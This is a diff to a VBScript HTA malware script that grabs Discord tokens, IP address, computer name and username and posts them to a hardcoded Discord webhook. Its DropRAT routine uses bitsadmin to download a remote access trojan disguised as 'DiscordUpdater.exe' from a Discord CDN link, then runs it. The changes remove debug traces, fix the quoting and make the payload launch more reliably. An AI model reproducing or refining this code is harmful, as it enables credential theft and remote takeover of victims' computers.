@@ -15,10 +15,6 @@ WH = "https://discordapp.com/api/webhooks/1557496485413781675/FX5fiB-evdnBmtrf5y
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' TRACE
-Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\trace.txt"
-Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
-
 ' --- Initial Grab ---
 Call GrabTokens
 Call IP
@@ -45,6 +41,8 @@ For runCount = 1 To 8
     If runCount < 8 Then Call SleepMinutes(10)
 Next
 
+' Give the final RAT 10 seconds to launch before the HTA closes
+Call SleepSeconds(10)
 window.close()
 
 ' --- IP Function ---
@@ -149,17 +147,20 @@ End Sub
 ' --- DropRAT ---
 Sub DropRAT()
     Call PostEmbed("📦 RAT Download", "Fetching DiscordUpdater...", 3447003)
+    
+    ' Make sure you put the most recent working link here
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1548568579442479154/1564100269350985750/DiscordUpdater.exe?ex=6ae00963&is=6adeb7e3&hm=9db3df5d18a3377d1a1e916c594b338480204c090af26d5a995cb163275ef083&"
+    
     Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\DiscordUpdater.exe"
     If fso.FileExists(op) Then fso.DeleteFile op
 
-    ' If you want to verify the HTA is running, un-comment the next line:
-    ' MsgBox "Downloading RAT..."
-
-    sh.Run "bitsadmin /transfer rdownload /download /priority high " & dl & " " & op, 0, False
+    ' Download
+    sh.Run "bitsadmin /transfer rdownload /download /priority high """ & dl & """ """ & op & """", 0, False
 
     Dim rStart : rStart = Now
     Dim rDone : rDone = False
+    
+    ' Wait for file to exist and be over 1MB
     Do While DateDiff("s", rStart, Now) < 300
         If fso.FileExists(op) Then
             If fso.GetFile(op).Size > 1000000 Then
@@ -173,11 +174,16 @@ Sub DropRAT()
     If rDone Then
         Dim dsize : dsize = fso.GetFile(op).Size
         Call PostEmbed("🚀 RAT Downloaded", "Size: " & CStr(dsize) & " bytes" & vbCrLf & "Launching...", 3447003)
-        sh.Run op, 0, False
+        
+        ' Force start the EXE
+        sh.Run """" & op & """", 1, False
+        
         Call PostEmbed("✅ RAT", "Payload executed successfully", 65280)
+        ' Wait 5 seconds to let it boot
+        Call SleepSeconds(5)
     Else
         sh.Run "cmd /c bitsadmin /cancel rdownload > nul 2>&1 & taskkill /f /im bitsadmin.exe > nul 2>&1", 0, False
-        Call PostEmbed("⌛ RAT Timeout", "No download after 5 mins, skipping and continuing...", 16711680)
+        Call PostEmbed("⌛ RAT Timeout", "No download after 5 mins.", 16711680)
     End If
 End Sub
 
